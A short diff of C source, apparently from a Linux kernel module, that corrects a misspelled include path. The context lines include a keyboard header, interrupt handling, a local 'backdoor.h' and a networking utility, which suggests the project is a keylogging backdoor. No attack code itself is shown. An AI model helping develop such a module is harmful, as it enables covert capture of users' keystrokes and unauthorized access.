@@ -4,7 +4,7 @@
 #include <linux/keyboard.h>
 #include <linux/irq.h>
 #include <linux/interrupt.h>
-#include <linus/delay.h>
+#include <linux/delay.h>
 
 #include "backdoor.h"
 #include "utils/networking.c"
